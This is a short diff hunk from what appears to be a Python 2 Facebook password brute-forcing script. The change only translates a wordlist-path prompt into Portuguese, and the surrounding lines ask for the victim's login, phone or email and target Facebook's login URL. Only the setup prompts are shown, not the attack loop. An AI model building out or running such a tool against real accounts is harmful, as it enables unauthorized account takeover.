@@ -19,7 +19,7 @@ print  '+-----------------------------------------+'
 email = str(raw_input("Digite o Login, Número de telefone ou email da vitima: "))
 
 
-passwordlist = str(raw_input("Enter the wordlist name and path : "))
+passwordlist = str(raw_input("Digite o caminho da sua Wordlist: "))
 
 
 login = 'https://www.facebook.com/login.php?login_attempt=1'
